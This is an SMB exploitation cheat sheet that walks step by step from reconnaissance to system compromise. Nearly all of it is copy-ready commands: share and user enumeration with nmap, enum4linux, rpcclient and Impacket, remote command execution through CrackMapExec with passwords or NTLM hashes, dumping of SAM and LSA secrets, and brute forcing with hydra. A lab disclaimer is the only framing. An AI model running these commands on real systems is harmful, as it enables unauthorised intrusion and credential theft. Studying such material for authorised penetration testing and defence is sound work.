# SMB Exploitation — Cheat Sheet

This cheat sheet summarizes real SMB hacking techniques — from reconnaissance to full system compromise — with ready-to-use commands you can test in your own lab.

---

## 🔍 Step 1: Enumerating SMB Services

### Identify Open SMB Ports
```bash
nmap -p 139,445 <IP>
nmap -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users <target-ip>
```

### Full Enumeration with enum4linux
```bash
enum4linux -a <target_ip>
```

### Identify SMB Version
**Metasploit:**
```bash
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS <target_ip>
run
```
**Custom script:**
```bash
./smbver.sh <target_ip> {port}
```

---

## 📂 Step 2: Dumping SMB Information

### Using enum4linux & enum4linux-ng
```bash
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
```

### Using Nmap
```bash
nmap --script "safe or smb-enum-*" -p 445 <IP>
```

### rpcclient
```bash
rpcclient -U "" -N <IP>
rpcclient -U "username%passwd" <IP>
```

### Impacket
```bash
samrdump.py -port 139,445 [[domain/]username[:password]@]<target>
rpcdump.py -port 135,139,445 [[domain/]username[:password]@]<target>
```

---

## 👥 Step 3: Enumerating Users & Groups

```bash
crackmapexec smb <IP> --users
crackmapexec smb <IP> --groups
crackmapexec smb <IP> --groups --loggedon-users
```

**LDAP Enumeration:**
```bash
ldapsearch -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))" -h <IP>
```

**Metasploit SID Lookup:**
```bash
use auxiliary/scanner/smb/smb_lookupsid
set RHOSTS domain.local
run
```

---

## 📁 Step 4: Shared Folder Enumeration

### List Shares
```bash
smbclient --no-pass -L //<IP>
smbmap -H <IP>
crackmapexec smb <IP> --shares
```

### Connect to Shares
```bash
smbclient //<IP>/<Folder> -U 'username%passwd'
smbmap -u "user" -p "pass" -R [Folder] -H <IP>
```

---

## 💻 Step 5: Exploitation with CrackMapExec

Install:
```bash
apt-get install crackmapexec
```

Execute commands:
```bash
crackmapexec smb <IP> -u Administrator -p 'password' -x whoami
crackmapexec smb <IP> -u Administrator -H <NTHASH> -x whoami
```

Dump hashes & users:
```bash
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users
```

---

## 🔑 Step 6: Brute Forcing SMB

**Nmap:**
```bash
nmap --script smb-brute -p 445 <IP>
```

**Hydra:**
```bash
hydra -l Administrator -P wordlist.txt <IP> smb -t 1
```

---

## 📜 Step 7: Post-Exploitation

Check configs:
```bash
cat /etc/samba/smb.conf
smbstatus
```

Dump sessions and policies:
```bash
crackmapexec smb <IP> -u Administrator -p 'password' --sessions
crackmapexec smb <IP> -u Administrator -p 'password' --pass-pol
```

---

## References
- EternalBlue (CVE-2017–0144) exploit background  
- Impacket tools: https://github.com/fortra/impacket  
- CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec  
